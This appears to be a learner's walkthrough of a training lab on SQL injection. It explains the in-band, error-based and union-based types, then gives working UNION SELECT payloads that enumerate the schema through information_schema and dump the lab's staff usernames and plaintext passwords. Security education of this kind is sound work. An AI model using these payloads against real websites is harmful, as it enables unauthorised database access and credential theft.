## In-Band SQL Injection

In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.


## Error-Based SQL Injection

This type of SQL Injection is the most useful for easily obtaining information about the database structure, as error messages from the database are printed directly to the browser screen. This can often be used to enumerate a whole database. 


## Union-Based SQL Injection
This type of Injection utilises the SQL UNION operator alongside a SELECT statement to return additional results to the page. This method is the most common way of extracting large amounts of data via an SQL Injection vulnerability.

## Practical
The key to discovering **error-based SQL Injection** is to break the code's SQL query by trying certain characters until an error message is produced; these are most commonly single apostrophes ( ' ) or a quotation mark ( " ).

Try typing an apostrophe ( ' ) after the id=1 and press enter. And you'll see this returns an SQL error informing you of an error in your syntax. The fact that you've received this error message confirms the existence of an SQL Injection vulnerability. We can now exploit this vulnerability and use the error messages to learn more about the database structure. 

The first thing we need to do is return data to the browser without displaying an error message. Firstly, we'll try the UNION operator so we can receive an extra result if we choose it. Try setting the mock browsers id parameter to:

`1 UNION SELECT 1`


This statement should produce an error message informing you that the UNION SELECT statement has a different number of columns than the original SELECT query. So let's try again but add another column:


`1 UNION SELECT 1,2`


Same error again, so let's repeat by adding another column:


`1 UNION SELECT 1,2,3`


Success, the error message has gone, and the article is being displayed, but now we want to display our data instead of the article. The article is displayed because it takes the first returned result somewhere in the website's code and shows that. To get around that, we need the first query to produce no results. This can simply be done by changing the article ID from 1 to 0.


`0 UNION SELECT 1,2,3`


You'll now see the article is just made up of the result from the UNION select, returning the column values 1, 2, and 3. We can start using these returned values to retrieve more useful information. First, we'll get the database name that we have access to:


`0 UNION SELECT 1,2,database()`


You'll now see where the number 3 was previously displayed; it now shows the name of the database, which is sqli_one.


Our next query will gather a list of tables that are in this database.


`0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'`


The method group_concat() gets the specified column (in our case, table_name) from multiple returned rows and puts it into one string separated by commas. The next thing is the information_schema database; every user of the database has access to this, and it contains information about all the databases and tables the user has access to. In this particular query, we're interested in listing all the tables in the sqli_one database, which is article and staff_users. 


As the first level aims to discover Martin's password, the staff_users table is what interests us. We can utilise the information_schema database again to find the structure of this table using the below query.


`0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'`


This is similar to the previous SQL query. However, the information we want to retrieve has changed from table_name to column_name, the table we are querying in the information_schema database has changed from tables to columns, and we're searching for any rows where the table_name column has a value of staff_users.


The query results provide three columns for the staff_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.


`0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users`


Again, we use the group_concat method to return all of the rows into one string and make it easier to read. We've also added `,':',` to split the username and password from each other. Instead of being separated by a comma, we've chosen the HTML <br> tag that forces each result to be on a separate line to make for easier reading.

## SQL injection example
First, lists all databases accessible to the current user.

`0 UNION SELECT null, null, GROUP_CONCAT(schema_name) FROM information_schema.schemata;`

The page returned **information_schema,sqli_one**, let list all tables from sqli_one database

`0 UNION SELECT null, null, GROUP_CONCAT(table_name) FROM information_schema.tables where table_schema = 'sqli_one'`

The page return **article,staff_users**, now we keep finding the columns name with the payload:

`0 UNION SELECT null, null, GROUP_CONCAT(column_name) FROM information_schema.columns where table_schema = 'sqli_one'`

The page return **content,id,subject,id,password,username**, now we could get the username and password 

`0 UNION SELECT null, GROUP_CONCAT(username), GROUP_CONCAT(password) FROM staff_users`

The page return **admin,martin,jim** and **p4ssword,pa$$word,work123**

![alt text](image-20.png)